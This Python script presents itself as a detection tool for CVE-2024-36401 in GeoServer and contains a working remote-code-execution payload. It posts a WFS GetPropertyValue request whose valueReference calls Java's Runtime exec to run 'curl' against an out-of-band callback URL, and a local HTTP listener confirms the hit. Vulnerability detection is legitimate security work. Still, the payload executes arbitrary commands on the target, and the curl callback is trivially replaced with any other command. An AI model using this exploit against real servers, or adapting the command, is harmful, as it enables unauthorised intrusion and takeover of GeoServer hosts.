# Jakab √Åkos (jakabakos)
# Based on https://github.com/bigb0x/CVE-2024-36401
# Detection script for CVE-2024-36401

import requests
import argparse
import re
import os
import threading
import time
import socket
from urllib.parse import urlparse
import select
from urllib3.exceptions import InsecureRequestWarning
from http.server import SimpleHTTPRequestHandler, HTTPServer

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

class OOBServerHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        print("The instance seems to be VULNERABLE (OOB request is received).")
        #super().log_message(format, *args)
        os._exit(1)

def start_oob_server(port):
    server_address = ('', port)
    httpd = HTTPServer(server_address, OOBServerHandler)
    print(f"Starting OOB server at port {port}")
    httpd.serve_forever()

def send_request(url, type, oob_url):
    full_url = f"{url}/geoserver/wfs"
    headers = { "Content-Type": "application/xml" }
    payload = f"""
        <wfs:GetPropertyValue service='WFS' version='2.0.0'
         xmlns:topp='http://www.openplans.org/topp'
         xmlns:fes='http://www.opengis.net/fes/2.0'
         xmlns:wfs='http://www.opengis.net/wfs/2.0'>
          <wfs:Query typeNames='{type}'/>
          <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'curl {oob_url}')</wfs:valueReference>
        </wfs:GetPropertyValue>
    """
    
    try:
        response = requests.post(full_url, headers=headers, data=payload, timeout=10, verify=False)
        if 'InvalidParameterValue' in response.text:
            print(f"The Feature Type is not right. Please try with another.")
            os._exit(1)
            #print(f"Response status code: {response.status_code}")
            #print(f"Response text: {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        print("Failed to send request!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Detection script for CVE-2024-36401')
    parser.add_argument('--target', '-t', required=True, help='Target URL, for example https://localhost:9090')
    parser.add_argument('--type', required=True, help='Feature Type, example workspace:featuretype')
    parser.add_argument('--oob_server', help='Out-of-band server URL, for example http://xxx.oastify.com')
    parser.add_argument('--port', type=int, default=4242, help='Port for local OOB server (default: 4242)')
    parser.add_argument('--sleep-time','-s', type=int, default=10, help='Time in seconds to wait for incoming request')
    args = parser.parse_args()
    
    if args.oob_server:
        oob_url = args.oob_server
    else:
        ip = get_ip()
        port = args.port
        oob_url = f'http://{ip}:{port}'
        threading.Thread(target=start_oob_server, args=(port,), daemon=True).start()
        time.sleep(2)  # Wait for the server to start

    send_request(args.target, args.type, oob_url)

    if not args.oob_server:
        time.sleep(args.sleep_time)  # Wait for the request
        print("The instance seems NOT to be VULNERABLE (OOB request is not received).")
    else:
        print("Check your OOB server's log.")
